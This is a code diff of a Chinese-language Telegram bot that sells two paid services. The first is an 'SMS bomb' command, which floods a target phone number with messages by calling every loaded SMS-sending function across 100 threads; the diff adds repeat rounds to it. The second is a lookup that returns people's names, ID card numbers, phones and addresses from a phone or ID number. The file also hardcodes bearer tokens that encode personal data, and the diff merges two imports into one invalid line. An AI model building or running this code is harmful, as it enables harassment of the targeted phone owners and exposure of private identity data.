@@ -11,8 +11,7 @@ import random
 import concurrent.futures
 import inspect  
 import sms_list 
-from sms_list import * 
-from Crypto.Cipher import DES3
+from sms_list import * from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
 from concurrent.futures import ThreadPoolExecutor
@@ -25,7 +24,6 @@ POINTS_FILE = 'points.json'
 TOKEN_FILE = 'token.txt'
 DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 
 
-# 这里的 AUTH_BEARER 建议定期检查是否失效
 AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -102,19 +100,12 @@ def hb_search_logic(chat_id, search_value, uid):
             if "error" in result_data:
                 bot.send_message(chat_id, result_data["error"])
             elif "page" in result_data and result_data["page"]:
-                # --- 修改点：hb查询积分改为 3.5 ---
                 user_points[uid] -= 3.5
                 save_points()
-
                 result_message = "✅查询结果:\n"
                 for item in result_data["page"]:
-                    result_message += f"姓名:{item['resName']}\n"
-                    result_message += f"证件:{item['sfcode']}\n"
-                    result_message += f"手机:{item['mobile']}\n"
-                    result_message += f"地址:{item['address']}\n\n"
-                
-                result_message += f"已扣除 **3.5** 积分！\n"
-                result_message += f"当前积分余额：**{user_points[uid]:.2f}** 积分"
+                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
+                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
                 bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
             else:
                 bot.send_message(chat_id, "查询为空")
@@ -234,24 +225,16 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 核心：接口全量加载器 =================
+# ================= 5. 核心：接口全量加载与轰炸逻辑 =================
 
 def get_all_senders():
     """✨ 全自动扫描：动态加载 sms_list 中所有的接口函数"""
     all_funcs = []
-    # 辅助工具和非接口函数排除名单
     excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
-    
-    # 扫描模块中的所有函数
     for name, obj in inspect.getmembers(sms_list):
         if inspect.isfunction(obj) and name not in excludes:
-            try:
-                # 自动核验该函数是否支持接收一个手机号参数
-                sig = inspect.signature(obj)
-                if len(sig.parameters) >= 1:
-                    all_funcs.append(obj)
-            except:
-                pass
+            if name.startswith('send_') or name.startswith('api_'):
+                all_funcs.append(obj)
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -265,27 +248,34 @@ def sms_bomb_cmd(message):
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
     
-    # 实时获取合并后的最新接口列表
+    # 记录状态，进入询问次数环节
+    user_states[message.chat.id] = {'step': 'wait_sms_count', 'target': target}
+    bot.reply_to(message, f"🎯 目标：`{target}`\n请输入轰炸轮数 (1-10)：", parse_mode='Markdown')
+
+def execute_bomb(chat_id, target, count, uid):
     all_funcs = get_all_senders()
-    bot.reply_to(message, f"🎯 **接口装载成功：{len(all_funcs)}个**\n正在对 `{target}` 发起全面轰炸...", parse_mode='Markdown')
+    base_count = len(all_funcs)
+    total_calls = base_count * count
+    
+    bot.send_message(chat_id, f"🚀 **任务启动！**\n接口数量：`{base_count}`\n运行轮数：`{count}`\n预计总请求：**{total_calls}** 次", parse_mode='Markdown')
     
     user_points[uid] -= 5.5; save_points()
 
-    def do_bomb():
-        random.shuffle(all_funcs)
-        # 并发效率配置
-        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
-            for func in all_funcs:
-                executor.submit(func, target)
-        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
-    
-    threading.Thread(target=do_bomb).start()
+    def run_process():
+        for i in range(count):
+            random.shuffle(all_funcs)
+            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+                for func in all_funcs:
+                    executor.submit(func, target)
+            time.sleep(1) # 轮次间隔
+        bot.send_message(chat_id, f"✅ 目标 `{target}` 任务执行完毕，共运行 {count} 轮。")
+
+    threading.Thread(target=run_process).start()
 
 # ================= 6. 管理与业务指令 =================
 
 @bot.message_handler(commands=['hb'])
 def hb_cmd(message):
-    # --- 修改点：hb查询门槛改为 3.5 ---
     if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足，请先充值！")
     bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")
 
@@ -346,8 +336,21 @@ def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
     if text.startswith('/'): return 
     
+    state = user_states.get(chat_id)
+    
+    # --- 处理轰炸轮数输入 ---
+    if state and state.get('step') == 'wait_sms_count':
+        if not text.isdigit():
+            return bot.reply_to(message, "⚠️ 请输入数字轮数！")
+        count = int(text)
+        if count < 1 or count > 10:
+            return bot.reply_to(message, "⚠️ 轮数需在 1-10 之间")
+        target = state['target']
+        del user_states[chat_id]
+        execute_bomb(chat_id, target, count, uid)
+        return
+
     if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
-        # --- 修改点：hb查询判定积分改为 3.5 ---
         if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足，请先充值！")
         return hb_search_logic(chat_id, text, uid)
 
@@ -356,7 +359,6 @@ def handle_all(message):
         if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足，请先充值！")
         return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
     
-    state = user_states.get(chat_id)
     if not state: return
 
     if state['step'] == 'v_name':
@@ -393,7 +395,6 @@ def handle_all(message):
 def handle_callback(call):
     uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
     if call.data == "view_help":
-        # --- 修改点：帮助菜单里的 hb 提示改为 3.5 ---
         help_text = (
             "🛠️️使用帮助\n"
             "短信测试 (新)\n"
